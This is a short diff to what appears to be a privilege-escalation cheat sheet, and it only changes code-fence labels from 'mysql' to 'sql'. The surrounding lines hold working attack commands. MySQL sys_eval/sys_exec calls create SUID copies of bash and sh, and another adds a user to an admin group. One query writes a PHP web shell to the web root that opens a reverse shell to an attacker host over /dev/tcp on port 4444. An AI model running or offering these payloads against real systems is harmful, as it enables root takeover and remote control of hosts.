@@ -27,7 +27,7 @@ SELECT sys_eval("cp /bin/bash /var/tmp/bash ; chmod u+s /var/tmp/bash");
 
 OR
 
-```mysql
+```sql
 select sys_exec('cp /bin/sh /tmp; chown root:root /tmp/sh; chmod +s /tmp/sh');
 select sys_exec('usermod -a -G admin USER');
 ```
@@ -37,7 +37,7 @@ cd /var/tmp
 ./bash -p
 ```
 
-```mysql
+```sql
 select "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/$ATTACKER/4444 0>&1'\");?>" into outfile "/var/www/.../shell.php";
 ```
 ---
